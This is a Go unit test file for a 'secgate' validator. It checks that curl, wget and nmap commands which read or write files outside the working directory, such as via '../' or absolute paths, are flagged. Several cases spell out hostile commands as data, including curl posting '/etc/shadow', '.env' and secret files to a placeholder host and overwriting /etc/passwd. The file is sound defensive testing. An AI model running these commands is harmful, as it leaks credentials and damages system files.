package secgate

import "testing"

func TestFileAccessViolation(t *testing.T) {
	cases := []struct {
		name string
		cmd  Command
		bad  bool
	}{
		{
			"curl -o relative-dotdot",
			Command{Binary: "curl", Args: []string{"-o", "../audit.jsonl", "http://h/"}},
			true,
		},
		{
			"curl -o absolute",
			Command{Binary: "curl", Args: []string{"-o", "/etc/passwd", "http://h/"}},
			true,
		},
		{
			"curl -d @absolute",
			Command{Binary: "curl", Args: []string{"-d", "@/abs/.env", "http://h/"}},
			true,
		},
		{
			"curl -d @dotdot",
			Command{Binary: "curl", Args: []string{"-d", "@../secret", "http://h/"}},
			true,
		},
		{
			"nmap -oN dotdot",
			Command{Binary: "nmap", Args: []string{"-oN", "../x", "10.0.0.5"}},
			true,
		},
		{
			"curl -o relative (allowed)",
			Command{Binary: "curl", Args: []string{"-o", "out.txt", "http://h/"}},
			false,
		},
		{
			"ffuf -w input read (allowed)",
			Command{Binary: "ffuf", Args: []string{"-w", "/usr/share/wordlists/x"}},
			false,
		},
		{
			"nmap plain scan (allowed)",
			Command{Binary: "nmap", Args: []string{"-p", "80", "10.0.0.5"}},
			false,
		},
		{
			"curl --output= long form dotdot",
			Command{Binary: "curl", Args: []string{"--output=../audit.jsonl", "http://h/"}},
			true,
		},
		{
			"curl --data= long form absolute at-file",
			Command{Binary: "curl", Args: []string{"--data=@/etc/shadow", "http://h/"}},
			true,
		},
		{
			"curl -F form field at-file dotdot",
			Command{Binary: "curl", Args: []string{"-F", "file=@../secret", "http://h/"}},
			true,
		},
		{
			"curl --data-raw with leading @ is literal, not a file ref",
			Command{Binary: "curl", Args: []string{"--data-raw", "@../not-a-path", "http://h/"}},
			false,
		},
		{
			"curl -d plain literal data (no @)",
			Command{Binary: "curl", Args: []string{"-d", "key=value", "http://h/"}},
			false,
		},
		{
			"wget -O absolute",
			Command{Binary: "wget", Args: []string{"-O", "/tmp/evil", "http://h/"}},
			true,
		},
		{
			"path binary base name (/usr/bin/curl) still checked",
			Command{Binary: "/usr/bin/curl", Args: []string{"-o", "/etc/passwd", "http://h/"}},
			true,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			arg, bad := FileAccessViolation(tc.cmd)
			if bad != tc.bad {
				t.Errorf("FileAccessViolation(%+v) = (%q, %v), want bad=%v", tc.cmd, arg, bad, tc.bad)
			}
			if bad && arg == "" {
				t.Error("bad=true must report the offending arg")
			}
		})
	}
}
